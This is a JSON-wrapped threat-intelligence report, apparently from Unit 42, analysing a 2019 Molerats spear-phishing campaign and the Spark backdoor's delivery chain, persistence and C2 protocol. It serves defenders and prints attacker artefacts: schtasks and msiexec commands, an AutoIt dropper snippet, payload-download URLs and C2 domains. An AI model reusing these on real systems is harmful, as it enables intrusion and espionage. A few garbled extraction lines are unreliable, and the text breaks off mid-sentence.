{
    "id": "71435492-3b30-4f54-b040-3eb5fecb728f",
    "created_at": "2023-01-12T15:07:55.492947Z",
    "updated_at": "2025-03-27T02:17:11.825777Z",
    "deleted_at": null,
    "sha1_hash": "aff88247ebf40f7e53f7854280032cec8ac447e7",
    "title": "2020-03-03 - Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations",
    "authors": "",
    "file_creation_date": "2022-05-28T00:35:59Z",
    "file_modification_date": "2022-05-28T00:35:59Z",
    "file_size": 3252646,
    "plain_text": "# Molerats Delivers Spark Backdoor to Government and Telecommunications Organizations\n\n**unit42.paloaltonetworks.com/molerats-delivers-spark-backdoor/**\n\nRobert Falcone, Bryan Lee, Alex Hinchliffe March 3, 2020\n\nBy [Robert Falcone,](https://unit42.paloaltonetworks.com/author/robertfalcone/) [Bryan Lee and](https://unit42.paloaltonetworks.com/author/bryanlee/) [Alex Hinchliffe](https://unit42.paloaltonetworks.com/author/alex-hinchliffe/)\n\nMarch 3, 2020 at 6:00 AM\n\n[Category: Malware,](https://unit42.paloaltonetworks.com/category/malware-2/) [Unit 42](https://unit42.paloaltonetworks.com/category/unit-42/)\n\nTags: [Gaza Hacking Team,](https://unit42.paloaltonetworks.com/tag/gaza-hacking-team/) [JhoneRAT,](https://unit42.paloaltonetworks.com/tag/jhonerat/) [Macros,](https://unit42.paloaltonetworks.com/tag/macros/) [MoleRats,](https://unit42.paloaltonetworks.com/tag/molerats/) [Spark](https://unit42.paloaltonetworks.com/tag/spark/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/molerats-delivers-spark-backdoor/)\n\n## Executive Summary\n\nBetween October 2019 through the beginning of December 2019, Unit 42 observed multiple instances of phishing attacks likely related to a\nthreat group known as Molerats (AKA Gaza Hackers Team and Gaza Cybergang) targeting eight organizations in six different countries in the\ngovernment, telecommunications, insurance and retail industries, of which the latter two were quite peculiar. The targeting of insurance and\nretail organizations is peculiar as it does not fit with this threat groups prior target set. The email subject and attachment file names used in the\nattacks on these seemingly atypical targets were similar in theme as those used when attacking government organizations. The lack of\nindustry or target specific social engineering themes likely lowers the chances of a successful compromise and further confuses our\nunderstanding of the purpose of attacking these organizations.\n\nAll of the attacks involved spear-phishing emails to deliver malicious documents that required the recipient to carry out some action. The social\nengineering techniques included lure images attempting to trick the user into enabling content to run a macro and even document contents that\nthreaten to release compromising pictures to the media to coerce the user into clicking a link to download a malicious payload. The payload in\n[a majority of these attacks was a backdoor called Spark, which is a backdoor that allows the threat actors to open applications and run](https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one)\ncommand line commands on the compromised system.\n\n[The Spark backdoor has been used by Molerats since at least 2017 and is associated with the Operation Parliament campaign, which is](https://securelist.com/operation-parliament-who-is-doing-what/85237/)\n[attributed to the Gaza Cybergang. The payload delivered in one of the attacks appears to be related to JhoneRAT, which may suggest the](https://blog.talosintelligence.com/2020/01/jhonerat.html)\nthreat group has added another custom payload to their toolset.\n\nMolerats has been in operation as far back as 2011 targeting government organizations around the world, largely been associated with attacks\ninvolving unauthorized access and sensitive data collection.They have been observed using a bevy of tactics and techniques, ranging from\nleveraging publicly available backdoor tools, such as PoisonIvy or XtremeRAT, to creating custom developed ones such as KASPERAGENT\nand MICROPSIA. In the campaign that we tracked, this group primarily relied on social engineering and spear-phishing techniques for their\ninitial infection vector, then multi-stage command-and-control (C2) servers for malware delivery.\n\n\n-----\n\no e ats used a a ety o tec ques to a e detect o a d a a ys s d cu t, suc as pass o d p otect g de e y docu e ts, t g t e\nexecution of the Spark payload to only run on systems with an Arabic keyboard and locale and the use of the commercial packer Enigma to\nobfuscate the payloads. The Spark C2 channel also attempts to evade detection, as the data in the HTTP POST requests and responses is\nencrypted using either 3DES or AES with randomly generated keys that appear to be unique for each payload.\n\n## Starting Point\n\nIn November 2019, Unit 42 was made aware of a single phishing email directed at a Saudi Arabian government organization. This attack\ninvolved a password-protected Microsoft Word document, which contained an embedded macro. The password for the document was\nprovided to the victim in the body of the email. From the artifacts discovered in this attack, we were able to use our AutoFocus product to pivot\nto additional attacks and uncover what turned out to be an attack campaign by Molerats.\n\nUsing our AutoFocus tool, we were able to find several attacks sent from the actors starting on October 2 through December 9, 2019. The\nemails were sent to organizations in the government and telecommunications verticals and had a mixture of specific and generic email\nsubjects and attachment filenames. We also saw sessions associated with this attack campaign involving two US-based organizations, one in\nthe retail and the other in the insurance industry.\n\nThe files attached to these emails were all documents, with the majority being Word documents and one PDF document. Table 1 shows a list\nof the emails used in this attack campaign, including the details of the email and the country and industry of the targeted organization. In this\nblog, we will provide an analysis of three of the seven delivery documents listed in Table 1, as the four unique delivery documents with MOFA\nin their file names are extremely similar to each other. The last delivery document (‘Urgent.docx’) was the delivery document discussed in\n[Cisco Talos' research on a new payload called JhoneRAT, which may suggest that this group also uses JhoneRAT in their attack campaigns in](https://blog.talosintelligence.com/2020/01/jhonerat.html)\nthe region.\n\n**Date** **Subject** **Attachment** **SHA256** **Country** **Industry**\n\n\n10/2/2019 MOFA reports 03-10-2019 MOFA031019.doc\n\n10/3/2019 03-10-2019 MOFA031019.doc\n\n10/5/2019 06-10-2019 MOFA061019.doc\n\n10/10/2019 MOFA Reports MOFA101019.doc\n\n\nd19104ef4f443e8.. AE Gov\n\nd19104ef4f443e8.. UK,ES Gov\n\n03be1d7e1071b01.. AE Gov\n\n\n011ba7f9b4c508f..\nddf938508618ff7..\n\n\nUS Insurance,Retail\n\n\n10/31/2019 2019-10-31 اﻟﻤﺮﻓﻖ- ﻟﻌﻨﺎﯾﺔ ﻣﻌﺎﻟﯿﻜﻢattachment.doc eaf2ba0d78c0fda.. DJ Telecom\n\n11/2/2019 2019-10-31 اﻟﻤﺮﻓﻖ- ﻟﻌﻨﺎﯾﺔ ﻣﻌﺎﻟﯿﻜﻢattachment.doc eaf2ba0d78c0fda.. DJ Telecom\n\n\n11/18/2019ﺻﻮرك\n\n<redacted>\n\nﻣﻊ ﻫﺒﺔ\n\n\nPictures.pdf 9d6ce7c585609b8.. ES Gov\n\n\n11/24/2019ﻣﺨﻄﻂ اﻟﺠﻬﺎد اﻻﺳﻼﻣﻲ ﻟﻤﺒﺎﻏﺘﺔ اﺳﺮاﺋﯿﻞ وﺿﺮب اﻟﺘﻬﺪﺋﺔUrgent.docx 273aa20c4857d98.. DJ Telecom\n\n\n12/9/2019 -12-09 ﻣﺤﻀﺮ اﺟﺘﻤﺎع ﻗﯿﺎدة اﻟﻤﺨﺎﺑﺮات اﻟﻌﺎﻣﺔ ﻣﻊ وﻓﺪ ﺣﺮﻛﺔ ﺣﻤﺎس\n2019\n\n_Table 1. Details of spear-phishing emails seen in this attack campaign_\n\n## MOFA Delivery Document\n\n\nUrgent.docx 273aa20c4857d98.. DJ Telecom\n\n\nThe first document we collected and analyzed had the filename MOFA- 061019.doc (SHA256:\n03be1d7e1071b018d3fbc6496788fd7234b0bb6d3614bec5b482f3bf95aeb506). This document was password-protected with the password\nAbdullah@2019. When opening and supplying the password, the victim was presented with contents that include what appears missing\nimages, as seen in Figure 1.\n\n\n-----\n\nFigure 1. Lure image in MOFA delivery document\n[Once the victim then enabled the embedded macro inside the document, the macro decodes an embedded VBScript (T1064) and saves it to](https://attack.mitre.org/techniques/T1064)\nC:\\programdata\\Micorsoft\\Microsoft.vbs. The Microsoft.vbs script will reach out to the C2 domain servicebios[.]com to retrieve a second\nVBScript, which contained additional instructions to then retrieve the payload. The script downloads this secondary VBScript from the following\nURL and saves it to C:\\ProgramData\\PlayerVLC.vbs:\n\nhttps://servicebios[.]com/PlayerVLC.vbs\n\n[The initial VBScript will then create a scheduled task (T1053) to persistently run the secondary VBScript every minute by running the following](https://attack.mitre.org/techniques/T1053/)\ncommand:\n\nschtasks /create /sc minute /mo 1 /tn PlayerVLC /F /tr C:\\ProgramData\\PlayerVLC.vbs\n\nThe secondary VBScript attempts to download the executable payload from the following URL and saves it to C:\\ProgramData\\PlayerVLC.msi.\n\nhttps://servicebios[.]com/PlayerVLC.msi\n\n[After downloading the executable payload, the secondary VBScript runs the following command on the command line (T1059) to kill any](https://attack.mitre.org/techniques/T1059)\nexisting msiexec.exe process instances and use the ping application to sleep for two seconds before using the legitimate msiexec.exe\n[application (T1218) to launch the downloaded PlayerVLC.msi file:](https://attack.mitre.org/techniques/T1218/)\n\n%comspec% /c taskkill /F /IM msiexec.exe & ping 127.0.0.1 -n 2 >NUL & msiexec /i C:\\ProgramData\\PlayerVLC.msi /quiet /qn /norestart\n\nUnfortunately, we were unable to obtain the PlayerVLC.msi file, as it was no longer hosted by the C2 server. This highlights the benefits of a\nmodular payload that requires a chain of successful communications with a C2 server for a successful infection, as it makes post-intrusion\nanalysis difficult. This type of modular payload and chained C2 requests is fairly common, as we have seen it in use by various adversaries\nsuch as DarkHydrus and Sofacy. This behavior can assist the adversary in evading automated defenses, as they can deploy their\ninfrastructure at time of attack and avoid having additional artifacts available for further analysis.\n\n## Attachment Delivery Document\n\nThe Word document delivered on October 31 and November 2, 2019 (SHA256:\neaf2ba0d78c0fda95f0cf53daac9a89d0434cf8df47fe831165b19b4e3568000) had a filename of attachment.doc and attempted to trick the\nrecipient into clicking the “Enable Content” button to run an embedded macro. Figure 2 shows the lure image used in an attempt to trick the\nrecipient into clicking the “Enable Content” button. These documents were not password-protected, unlike the MOFA delivery documents\npreviously discussed.\n\n\n-----\n\nFigure 2. Lure image in Attachment delivery document\nThe macro is quite simple, as it attempts to download a base64 encoded executable from the following Google Drive URL that it will decode\nand save to %TEMP%\\rundll64.exe:\n\nhxxps://drive.google[.]com/uc?export=download&id=1yiDnuLRfQTBdak6S8gKnJLEzMk3yvepH\n\nThe decoded executable (SHA256: 7bb719f1c64d627ecb1f13c97dc050a7bb1441497f26578f7b2a9302adbbb128P) is a compiled AutoIt script\nthat installs an embedded executable to %userprofile%\\runawy.exe and runs it. Before exiting, the AutoIt script also makes sure the executable\nwill persistently run by copying the executable to the startup directory and by creating a scheduled task by running the following command:\n\nSCHTASKS /Create /f /SC minute /TN \"runawy\" /mo 5 /tr \"%userprofile%\\runawy.exe\"\n\nThe runawy.exe file (SHA256:64ea1f1e0352f3d1099fdbb089e7b066d3460993717f7490c2e71eff6122c431) is a payload packed with Enigma\nthat creates a mutex of “S4.4P”. This payload is a packed variant of the Spark backdoor, which has been exclusively linked to Molerats. We will\ndiscuss the Spark backdoor’s functionality in detail later in this blog, but this specific sample has the following configuration:\n\n{\"sIt\":\"nysura[.]com\",\"QrU\":\"/\",\"JJDF\":80,\"MJOu\":0,\"TuS\":\"\",\"pJhC\":1,\"Lm\":\"NMRm3AlaGUeT2g9iA2lNTIk04vSj8r2IBUDEvItgOxw=\",\"LPO\":10000}\n\n## Pictures PDF Delivery Document\n\nUnlike the prior two Word documents discussed, we observed a PDF document named “Pictures.pdf”\n(SHA256:9d6ce7c585609b8b23703617ef9d480c1cfe0f3bf6f57e178773823b8bf86495) attached to an email with a subject of ﺻﻮرك <redacted>\nﻣﻊ ﻫﺒﺔ, which roughly translates from Arabic to “Your filthy pictures with Heba”. The PDF document does not attempt to exploit a vulnerability,\nrather it contains a message meant to coerce the recipient into clicking a link to install the actor’s payload. Also, unlike the Word delivery\ndocuments that used finesse lure images and missing content in an attempt to trick the user into enabling macros, this PDF document uses a\nmore brash approach that contained a blackmail-esque message in an attempt to trick the user into clicking a link, opening a RAR archive and\nrunning an executable.\n\nThe message within the PDF document is in Arabic and suggests the sender has compromising pictures of the recipient that they will release\nto the media. The message also suggests the document was sent to an associate of a government official and was meant to threaten the\nvictim into clicking a link within the document. Figure 3 shows the contents within the PDF document.\n\n\n-----\n\nFigure 3. Screenshot of the contents of the malicious PDF document\nThe link within the document is in Arabic and roughly translates to “A small sample of your filthy pictures with Heba” and “Pictures”. The link\npoints to the following URL, which is case sensitive:\n\nhxxps://zmartco[.]com/Pictures.rar\n\nThe \"Pictures.rar\" file (SHA256: 1742caf26d41641925d109caa5b4ebe30cda274077fbc68762109155d3e0b0da) is a RAR archive that contains\none file with a filename of ﻫﺬه ﻋﯿﻨﺔ ﻗﻠﯿﻠﺔ ﻣﻦ اﻟﺼﻮر.exe (SHA256: 92d0c5f5ecffd3d3cfda6355817f4410b0daa3095f2445a8574e43d67cdca0b7),\nwhich roughly translates to \"This is a few sample photos.exe\". The executable is a compiled AutoIt script that extracts an embedded\nexecutable, saves it to disk at C:\\Users\\Public\\pdf.exe (SHA256:\n5139a334d5629c598325787fc43a2924d38d3c005bffd93afb7258a4a9a8d8b3) and creates a shortcut in Start Menu\\Programs\\Startup\\pdf.lnk\nto automatically start it each time the system starts, as seen here:\n\n\n1\n2\n3\n4\n5\n6\n\n\n#NoTrayIcon\nFileInstall(\"pdf.exe\", \"C:\\Users\\Public\\\" & \"/pdf.exe\")\n$cmd1 = \"C:\\Users\\Public\\\" & \"\\pdf.exe\"\nRunWait(@ComSpec & \" /c start \" & $cmd1, \"\", @SW_HIDE)\nFileCreateShortcut(\"C:\\Users\\Public\\\" & \"\\pdf.exe\", @StartupDir &\n\"\\pdf.lnk\")\n\n\nLike the “runawy.exe” payload delivered by the attachment.doc Word document, the \"pdf.exe\" file saved to the system is a packed variant of\nthe Spark backdoor. This variant of the backdoor had the following configuration:\n\n{\"xBql\":\"laceibagrafica[.]com\",\"eauy\":\"/\",\"Qnd\":80,\"jJN\":0,\"rlOa\":\"\",\"Eb\":1,\"BGa\":\"vcJbq6nzgJk=\",\"qJk\":10000}\n\n## Delivery Infrastructure\n\nOften when investigating attacks like these, links between infrastructure used across distinct campaigns can be easily found, such as by\ntracking reused IP addresses or domains, finding related domains sharing similar attributes, and so on. In the case of all the MOFA-related\ndelivery documents listed in Table 1, servicebios[.]com was the only domain used, and most of the infrastructure information related to\nhistorical usage.\n\nWith the AutoFocus Threat Intelligence service, we used alternative data points provided from our cloud sandbox, WildFire, during the analysis\nof said malicious documents in order to pivot and discover additional samples and related infrastructure. In this section we will discuss the\nmethods we used and describe the additional infrastructure.\n\n\n-----\n\ngu e be o s a a tego c a t s o g t e o d docu e ts a d sua as c Sc pt ( bs) es e ated to t e se ceb os[ ]co do a\nthe bottom half of the chart, with some of the related entities connected via one of two links, to other entities in the top half of the chart. Said\nlinks include Yara signatures in the blue box and an AutoFocus query in the orange box, as indicated by the “AF” for AutoFocus.\n\nFigure 4. Chart showing relationships between delivery\n\ndocuments and associated infrastructure\nThe AutoFocus query relates to a specific process execution chain leading to a Windows Scripting Host process (wscript.exe) launching the\nmalicious VBS downloader scripts. This allowed us to pivot on behavioural artefacts from the “MOFA- 101019.doc” (SHA256:\nddf938508618ff7f147b3f7c2b706968cace33819e422fe1daae78bc256f75a8) document to previously unknown documents “اﻟﺘﻘﺮﯾﺮ اﻟﯿﻮﻣﻲ ﺣﻮل أﻫﻢ\n2019 - 9 - 9 - اﻟﻤﺴﺘﺠﺪات اﻟﻔﻠﺴﻄﯿﻨﯿﺔ ﻟﯿﻮم.doc” (Daily report on the most important Palestinian developments, 9-9-2019.doc; SHA256:\nfeec28c7c19a8d0ebdca8fcfc0415ae79ef08362bd72304a99eeea55c8871e21) and “2019 - 9 - 9 -اﻟﺘﻘﺮﯾﺮ اﻟﯿﻮﻣﻲ ﺣﻮل أﺧﺮ ﻣﺴﺘﺠﺪات اﻹرﻫﺎب اﻟﻌﺎﻟﻤﻲ.doc”\n(Daily updates on the latest terrorism report Alaalmi- 9 - 9 - 2019.doc; SHA256:\nbf126c2c8f7d4263c78f4b97857912a3c1e87c73fee3f18095d58ef5053f2959).\n\nAs with the original Word document, the VBA macro code inside the new documents also used the open-source code “Base64 decode VBS\nfunction” from [Motobit to decode (T1027) the download function and URL to VBS before running it. The main difference between the VBS files](https://www.motobit.com/tips/detpg_Base64/)\nis the domain - dapoerwedding[.]com - where the secondary VBS payload was hosted. At the time of this activity the domain resolved to\n45.15.168[.]118 and was used in a previous campaign from September 2019.\n\nIn parallel to searching for related files using behavioural commonalities, we authored Yara signatures for the VBS code associated with the\noriginal delivery document, to scan our and VirusTotal’s corpus. This led to two additional VBS files: SHA256:\n85631021d7e84dc466b23cf77dd949ebc61011a52c1f0fb046cfd62dd9192a15 represents the 1st stage VBS downloader containing minor\nchanges to the domain and filename used, as follows:\n\nhttps://dapoerwedding[.]com/GoogleChrome.vbs\n\nThe second VBS file discovered (SHA256: 9451a110f75cbc3b66af5acb11a07a8d5e20e15e5487292722e695678272bca7) is the 2nd stage\nVBS downloader with reference to the final MSI file payload, which was unavailable at the time of writing:\n\nhttps://dapoerwedding[.]com/GoogleChrome.msi\n\n\n-----\n\ne e e a so ab e to d sco e add t o a o d docu e ts us g ot e uto ocus que es, as g g ted by t e t o ot e uto ocus\norange boxes in Figure X above. These maltego entities query our data using proprietary hashes calculated from the original document’s VBA\nmacro code, and resulted in SHA256: 602828399e24dca9259a4fc4c26f07408d1e0a638c015109c6c84986dc442ebb (servicebios[.]com), and\nSHA256s: a2c68da1b3e0115f5804a55768b2baf50faea81f13a16e563411754dc6c0a8ff and\n4f51b180a6d0b074778d055580788dc33c9e1fd2e49f3c9a19793245a8671cba (dapoerwedding[.]com).\n\nUpon initial inspection of dapoerwedding[.]com and servicebios[.]com, nothing stood out as having ties to previously documented Molerats\n[activity, however there were some commonalities (T1347) between the two domains:](https://attack.mitre.org/techniques/T1347/)\n\n1. Pre-existing domains\n2. Seemingly legitimate historical content\n3. Recently expired (and lapsed domain redemption grace period)\n[4. Post-expiry registrant (T1328) is NameCheap, Inc.](https://attack.mitre.org/techniques/T1328/)\n[5. Domain Validation (DV) SSL Certificates setup (T1337), issued by Sectigo](https://attack.mitre.org/techniques/T1337/)\n\nAnother delivery domain - zmartco[.]com - that shares the same commonalities listed above pertains to the “Pictures.pdf” delivery attachment\nlisted in Table 1 discussed in the previous section.\n\n## Spark Payload Related to Operation Parliament\n\nThe executables installed by the compiled AutoIt scripts is a backdoor that Molerats has used in many attack campaigns. Until recently, this\nbackdoor did not have its own moniker, but [Cybereason recently gave this backdoor a name of “Spark”. As mentioned in Cybereason’s blog,](https://www.cybereason.com/blog/new-cyber-espionage-campaigns-targeting-palestinians-part-one)\n[the Spark backdoor was also delivered in attacks occurring in January 2019, as discussed in a blog published by Qihoo 360. Based on our](https://ti.360.net/blog/articles/suspected-molerats-new-attack-in-the-middle-east-en/)\nresearch, the Spark backdoor has been used by Molerats since at least early 2017, as it was the main payload in the Operation Parliament\ncampaign reported by Kaspersky.\n\nSpark uses HTTP POST requests to communicate with its C2 server to receive commands and to exfiltrate the results, all of which using\nJSON-structured messages. In most cases, the threat actors use commercial packers to obfuscate the Spark payload to avoid detection.\nDuring our research, we have seen the actors use the Enigma protector, Themida and VMProtect, which makes identifying samples difficult.\nWe were also able to identify two different versions of Spark-based identifiers left in the binaries by the developer, which are version 2.2 and\n4.2. Based on the compilation times of the files with the Spark samples with identifiable version strings, it appears that version 2.2 was created\nin 2017, while version 4.2 was created in late December 2019 and January 2020. Table 2 shows these Spark samples that contained version\nnumbers, along with their compile time and the packer used to obfuscate their contents.\n\n**Truncated SHA256** **Version** **Compiled** **Packer**\n\n966ad6452793b15.. 2.2 2017-05-24 6:15:04 VMProtect\n\nab4e43b4e526d44.. 2.2 2017-05-24 6:15:04 VMProtect\n\n212aa6e3f236550.. 2.2 2017-05-24 6:15:04 VMProtect\n\ncf32479ed30ae95.. 4.2 2019-12-30 9:45:44 none\n\nd0dc1de0ae912c7.. 4.2 2020-01-12 10:57:50 Enigma\n\n04fa6aaea5e3a26.. 4.2 2020-01-12 10:57:50 Enigma\n\n6e60f5c65299ee7.. 4.2 2020-01-12 10:57:50 Enigma\n\nb08b8fddb9dd940.. 4.2 2020-01-12 10:57:50 Enigma\n\n64ea1f1e0352f3d.. 4.2 2020-01-12 10:57:50 Enigma\n\n_Table 2. Spark samples with their version number, compile time and the packer used_\n\nWe have collected dozens of Spark payloads, whose compile times range from March 2017 to January 2020, which further suggests this group\nhas been using this backdoor in attack campaigns for almost three years. We extracted the configurations from each of these files to gather\nthe known C2 domains associated with Spark, which we have included in Table 3.\n\n**Domain** **First used**\n\nwebtutorialz[.]com 1st Half 2020\n\nnysura[.]com 1st Half 2020\n\nlaceibagrafica[.]com 2nd Half 2019\n\nmotoqu[.]com 2nd Half 2019\n\nsmartweb9[.]com 1st Half 2019\n\n\n-----\n\nlaptower[.]com 2nd Half 2018\n\napp.msexchanges16[.]com 2nd Half 2018\n\nmsexchange13[.]com 2nd Half 2018\n\ncloudserviceapi[.]online 2nd Half 2018\n\nupdates.masterservices[.]online 2nd Half 2018\n\nclients.itresolver[.]online 1st Half 2018\n\nupdate.itresolver[.]online 1st Half 2018\n\n91.219.237[.]99 2nd Half 2017\n\ngoldenlines[.]site 2nd Half 2017\n\nupdate.nextdata[.]site 2nd Half 2017\n\n_Table 3. Spark C2 domains and the approximate time they were used_\n\nIn the next section, we will explain Spark’s capabilities and demonstrate its C2 channel that we determined from our analysis of the “pdf.exe”\npayload delivered by the Pictures.pdf document in the November 2019 attack.\n\n## Spark Payload in Pictures.pdf November 2019 Attack\n\n[The Spark payload installed by the compiled AutoIt script is packed with the commercial Enigma protector (T1045). When packing the payload,](https://enigmaprotector.com/)\n[the actor used a feature within Enigma protector called “Splash Screen”, which the actor configured to display an image on top of all the](https://enigmaprotector.com/en/help/manual/3fb53859f328dbe43332a934a9054fd1)\nwindows and waits for the user to click the image before executing the malicious code. Figure 5 shows the splash image displayed by the\n[Enigma protector prior to executing the malicious payload, which is a wallpaper image available at wallpaperswide.com. The splash screen](http://wallpaperswide.com/windows_10_hero_4k-wallpapers.html)\nfeature acts as a sandbox evasion technique, as it requires user interaction in the form of clicking the screen before the malicious code runs.\n\nFigure 5. Screenshot of the contents of the malicious PDF document\nOnce unpacked, we found the Spark payload was similar to the payloads delivered in Operation Parliament from a capability perspective. The\nSpark payload is a backdoor that allows the threat actors to open applications and run command line commands on the compromised system.\n\nThe payload starts by checking the results of the GetKeyboardLayoutList and the language name returned by GetLocaleInfoA to make sure\nthey contain the word \"arabic\". If the word is not found in the results of these two API calls, the payload does not execute any of its malicious\ncode. Checking for specific keyboards and languages is a known evasion tactic meant to avoid running on analysis systems not configured, as\nthe actor’s targeted victim would be configured\n\n\n-----\n\nte t e pay oad co s t at t e syste as t e app op ate eyboa d a d a guage pac sta ed o t e acto s des ed ta get, t beg\nattempting to communicate with a C2 server specified within a configuration embedded within the payload. The embedded configuration is\nencrypted and the payload decrypts it by first using a custom rolling XOR algorithm to decrypt a key and a buffer of ciphertext, resulting in a\nkey and ciphertext that appears encoded with base64. It will then generate the SHA256 hash of the base64 encoded key and use the fourth\nthrough the 28th bytes of the resulting hash as the final key. The payload will base64 decode the ciphertext and use the final key to decrypt the\ndecoded ciphertext using Triple DES (3DES), which results in a configuration that is structured in JSON. This particular payload had the keys\nand values seen in Table 3 below.\n\n**JSON Field** **JSON Value** **Description**\n\nxBql laceibagrafica[.]com Hostname of C2 server\n\neauy / URI of C2 server\n\nQnd 80 TCP port for C2 server\n\njJN 0 Sleep interval before entering the main C2 communications loop.\n\nrlOa <empty string> Unknown and does not appear to be used.\n\nEb 1 Unknown purpose, but sent to the C2 in the BrandentlK field\n\nBGa vcJbq6nzgJk= Hardcoded base64 encrypted string, which is the “Nickname” field likely used as a campaign identifier\n\nqJk 10000 Number of iterations of the main C2 communications loop before exiting the application.\n\n_Table 3. JSON key/value pairs within the payload’s configuration_\n\nThe payload also uses this same routine to decrypt an encrypted buffer that contains sleep intervals and more importantly a list of first names\nused to structure the messages sent to and from the C2 server, as well as the keys used to decrypt these messages. The payload will use the\nfirst names listed in Table 4 as JSON key names and values within messages sent to and received from the C2. We provide a description of\neach element of this decrypted buffer in the Appendix, but also show how the names in Table 4 are used within the C2 communications later in\nthis blog. Each of the values in Table 4 are unique per Spark sample, as the developer changes the names and the keys for each payload.\n\nLawrence Alanih Nevaeh Garrison ReeceWNM\n\nAllier Averizt LondonzO Zeke MorganE\n\nJaseN MathiasNbo JoslynKe ReesefP Winston\n\nIvory BrandentlK AngelxEv FrederickT Jessicay\n\nJonas AdalynngS ZaydenlnL KaileeXws VanessaFM\n\nReginacy AdelineRD Houstonod EverlyY Jordanlzw\n\nTrumanRd CollinsPM Maximiliano CallieVK Aryana\n\n_Table 4. First names used by Spark as JSON key/value pairs used for C2 communications_\n\nBefore communicating with the C2 server, the payload will decrypt one more buffer that contains strings that the payload uses for debugging\nmessages, as well as the commands it will use to gather system information. Table 5 shows the strings decrypted and their purpose.\n\n**Decrypted String**\n\n1\n\n311OEVZihfReZStoFf4cfg==\n\nZ9Q1WVryAIzLVSxF1yWRwg==\n\n\n-----\n\nP5K5He/2wSGGsvrFPKYpwg4KjBLyTOpbsGJwm1DckoyGK8eXeNMZCQBfHzkYRSjJlGcw6Ckn41X0MY3zJcU65uMvxpABv/g+ttABRJsG7js=\n\nAykC+x26hhd5DfrB/yly9gXcFsIlVxO9\n\nok\n\nCreate Pipe Error\n\nCreate processa error\n\nGet exit code process error\n\n0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_+\n\nSet handle information error\n\nWait for single object error\n\n_Table 5. JSON key/value pairs within a buffer that the payload uses to communicate with C2 server_\n\n### Spark C2 Communications\n\nThe payload communicates with its C2 server laceibagrafica[.]com by issuing HTTP POST requests with base64 encoded and encrypted\nmessages in the data section. We had not seen any previous explanation of this C2 channel, so we will provide an overview of the back and\nforth communications between the payload and C2 server to show how this payload uses the names in Table 4. To do this analysis, we created\n\nC2 t i t t ith th S k l d t i d ll f th HTTP i thi ti f th C2\n\n\n-----\n\nc eated a d ot a acto de e oped C so t a e gu e 6 s o s a t a beaco se t o t e pay oad to ts C se e o e e, a o t e\noutbound requests from the payload to the C2 will look similar visually, as they all use HTTP POST requests to the same URL with encoded\nand encrypted messages.\n\nFigure 6.Initial beacon sent from payload to C2 server\nThe data section in the initial beacon decodes and decrypts to the JSON message {\"CallieVK\":\"W10=\",\"ReeceWNM\":\"Jessicay\"}. The JSON\nmessage involves two key/value pairs with keys “ReeceWNM” and “CallieVK”, whose values transmit the communication type and the data,\nrespectfully. For instance, the “ReeceWNM” key includes the name “Jessicay” that is used to represent the initial beacon communication type.\nThe payload will decrypt the C2 servers’ response looking for a “EverlyY” field and uses the value for a sleep interval before continuing. Figure\n7 shows a response from the C2 server to the initial beacon, of which the response decrypts to {\"EverlyY\": 0}.\n\nFigure 7. Initial beacon sent from payload\n\nto C2 server\nAfter receiving the EverlyY response, the payload will gather system information, specifically the username, hostname and the system specific\nUUID by running the following command line commands using ‘cmd.exe’:\n\n1. wmic csproduct get UUID | more +1 | cmd /q /v:on /c \"set/p .=&echo(!.!\"\n2. hostname\n3. echo %username%\n\nThe payload will store each of these command results in JSON in base64 encoded ciphertext within a field name “ZaydenlnL” and using the\nfirst name “AngelxEv” to represent the type of data, which is a number that corresponds to the results in the list above with 1 representing the\nUUID, 2 the hostname and 3 the username. These three JSON objects are added to a JSON array with a name of “Maximiliano” and sent to\nthe C2 server. For example, the payload stores the system information in JSON as follows:\n\n{\"Maximiliano\":[{\"AngelxEv\":1,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext of UUID>\"},{\"AngelxEv\":3,\"Houstonod\":1,\"ZaydenlnL\":\"\n<base64 encoded ciphertext of username>\"},{\"AngelxEv\":2,\"Houstonod\":1,\"ZaydenlnL\":\"<base64 encoded ciphertext of hostname>\"}]}\n\nThe payload will create an outbound communications JSON object by setting the encoded system information JSON to the “CallieVK” value\nand setting the “ReeceWNM” value to the communication type “JoslynKe”. The resulting JSON will resemble the following:\n\n{\"CallieVK\":\"<base64 encoded ciphertext of system information “Maximiliano” JSON array>\",\"ReeceWNM\":\"JoslynKe\"}\n\nThe resulting JSON object is base64 encoded, encrypted and sent within the HTTP POST data to the C2 server, as seen in the example\nrequest in Figure 8.\n\n\n-----\n\nFigure 8. System information sent from payload to C2 server\nAfter sending the system information, the payload will expect to receive a command from the C2 server within the response. Figure 9 shows\nthe response to this request that contains encrypted data that the payload will parse for commands to execute.\n\nFigure 9. C2 server response containing ciphertext containing a command line command to execute\nThe payload does not have a command handler. Rather, it will process the JSON object within the C2’s response for applications to open\nand/or command line commands to run by calling the CreateProcessW API function. The expected JSON object contains an array named\n“Jordanlzw” that has one or more objects that will have a task identifier number in a field “Ivory”, an application name to run in a “Alanih” field,\nand the command line arguments to pass to the application in a “TrumanRd” field. For instance, the decrypted response in Figure 9 contains a\nJSON object would instruct the payload to run “c:\\windows\\system32\\cmd.exe” using the command line argument “/c whoami”, which\neffectively runs the “whoami” command:\n\n{\"Aryana\": 0, \"Jordanlzw\" :[{\"Ivory\" : 5, \"Jonas\" : true, \"Reginacy\" : false, \"TrumanRd\" : \"/NKg0zJdCDP1XlK9NJ4eJA==\", \"Alanih\" :\n\"i8KOnxchf86h8NKfF45XMETHhwTx6yF3AfMoWzyG9wA=\", \"LondonzO\" : true}]}\n\nAfter running the command provided by the C2, the payload will send a message to the C2 server that we believe is meant to notify the C2 that\nit received the command by sending the specific task identifier to the server. The payload will notify the C2 using the communication type\n\"MorganE\" as seen in the following JSON:\n\n{\"CallieVK\":\"eyJKYXNlTiI6W3siTGF3cmVuY2UiOjV9XX0=\",\"ReeceWNM\":\"MorganE\"}\n\nThe decoded data within the “CallieVK” field will contain a JSON array with a name of “JaseN” that contains one or more objects with a field\nname of “Lawrence” that contains the task numbers received, such as {\"JaseN\":[{\"Lawrence\":5}]}. This acknowledgement is sent to the C2\nserver, as seen in Figure 10:\n\nFigure 10. Payload notifying the C2 server that it received the command\nAfter acknowledging the receipt of command, the payload expects the C2 to respond with a JSON object with the “Allier” field set to a 